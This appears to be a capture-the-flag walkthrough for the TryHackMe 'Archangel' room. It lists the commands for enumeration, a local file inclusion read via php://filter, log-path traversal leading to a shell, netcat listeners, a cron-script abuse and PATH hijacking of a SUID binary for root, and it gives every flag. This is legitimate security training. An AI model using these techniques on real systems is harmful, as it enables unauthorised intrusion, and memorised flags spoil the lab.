# <div align="center">[Archangel](https://tryhackme.com/r/room/archangel)</div>
<div align="center">Boot2root, Web exploitation, Privilege escalation, LFI</div>
<br>
<div align="center">
<img src="https://github.com/user-attachments/assets/a2d75f44-5757-47a5-899a-0b4fc03059ab" height="200"></img>
</div>

## Task 1. Deploy Machine

A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it.
Answer the questions below
### Connect to openvpn and deploy the machine
```
No answer needed
```
## Task 2. Get a shell

Enumerate the machine
### Find a different hostname
* ```nmap -sC -sV -A -p- $IP```
* ```dirsearch -u <IP> -w /usr/share/wordlists/dirb/common.tx```
* ```curl -s <IP> | grep ".thm"```
```
mafialive.thm
```
### Find flag 1
* ```echo "<IP> mafialive.thm" | sudo tee -a /etc/hosts```
* ```curl -s http://mafialive.thm/```
```
thm{f0und_th3_r1ght_h0st_n4m3}
```
### Look for a page under development
* ```curl -s http://mafialive.thm/robots.txt```
```
test.php
```
### Find flag 2
* ```curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php```
* ```curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/test.php```
* ```curl -s http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php```
* ```echo "CQo8IURPQ1RZUEUgSFRNTD4KPGh0bWw+Cgo8aGVhZD4KICAgIDx0aXRsZT5JTkNMVURFPC90aXRsZT4KICAgIDxoMT5UZXN0IFBhZ2UuIE5vdCB0byBiZSBEZXBsb3llZDwvaDE+CiAKICAgIDwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iL3Rlc3QucGhwP3ZpZXc9L3Zhci93d3cvaHRtbC9kZXZlbG9wbWVudF90ZXN0aW5nL21ycm9ib3QucGhwIj48YnV0dG9uIGlkPSJzZWNyZXQiPkhlcmUgaXMgYSBidXR0b248L2J1dHRvbj48L2E+PGJyPgogICAgICAgIDw/cGhwCgoJICAgIC8vRkxBRzogdGhte2V4cGxvMXQxbmdfbGYxfQoKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICBpZihpc3NldCgkX0dFVFsidmlldyJdKSl7CgkgICAgaWYoIWNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcuLi8uLicpICYmIGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICcvdmFyL3d3dy9odG1sL2RldmVsb3BtZW50X3Rlc3RpbmcnKSkgewogICAgICAgICAgICAJaW5jbHVkZSAkX0dFVFsndmlldyddOwogICAgICAgICAgICB9ZWxzZXsKCgkJZWNobyAnU29ycnksIFRoYXRzIG5vdCBhbGxvd2VkJzsKICAgICAgICAgICAgfQoJfQogICAgICAgID8+CiAgICA8L2Rpdj4KPC9ib2R5PgoKPC9odG1sPgoKCg==" | base64 -d```

```
thm{explo1t1ng_lf1}
```
### Get a shell and find the user flag
* ```curl -s http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././../log/apache2/access.log```
* ```nc -lvnp 4444```
* ```python3 -c "import pty;pty.spawn('/bin/bash')"```
* ```id```
* ```ls```
### cat user.txt
```
thm{lf1_t0_rc3_1s_tr1cky}
```
## Task 3. Root the machine
Do privilege escalation 
### Get User 2 flag 
* ```cat /etc/crontab```
* ```nc -lvnp 4445```
* ```ls -la```
* ```cat helloworld.sh```
* ```cd secret```
* ```ls```
* ```cat user2.txt```
```
thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}
```
### Root the machine and find the root flag
* ```find /* -type f -perm -u=s 2>/dev/null```
* ```touch cp```
* ```nano cp```
* ```cat cp```
* ```#!/bin/bash```
* ```/bin/bash```
* ```chmod +x cp```
* ```export PATH=/home/archangel/secret:$PATH```
* ```./backup```
* ```cat /root/root.txt```
```
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```
### Done 🙂
